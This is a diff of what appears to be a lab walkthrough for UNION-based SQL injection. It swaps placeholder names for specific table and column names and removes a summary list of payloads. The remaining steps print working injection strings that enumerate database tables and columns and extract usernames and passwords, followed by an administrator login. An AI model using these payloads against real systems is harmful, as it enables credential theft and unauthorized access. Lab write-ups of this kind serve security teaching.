@@ -10,26 +10,20 @@
 ' UNION SELECT table_name, NULL FROM information_schema.tables--
 ```
 
-Look for a table like `users_XXXXX`.
+Look for a table like `users_phmarb`.
 
 2. List columns of that table:
 
 ```
-' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_XXXXX'--
+' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_phmarb'--
 ```
 
 3. Retrieve data:
 
 ```
-' UNION SELECT username_XXXXX, password_XXXXX FROM users_XXXXX--
+' UNION SELECT username_kirwfo, password_jvusjm FROM users_phmarb--
 ```
 
 4. Log in as administrator with the found password.
 
-## Key Payloads
 
-```
-' UNION SELECT table_name, NULL FROM information_schema.tables--
-' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_XXXXX'--
-' UNION SELECT username_XXXXX, password_XXXXX FROM users_XXXXX--
-```
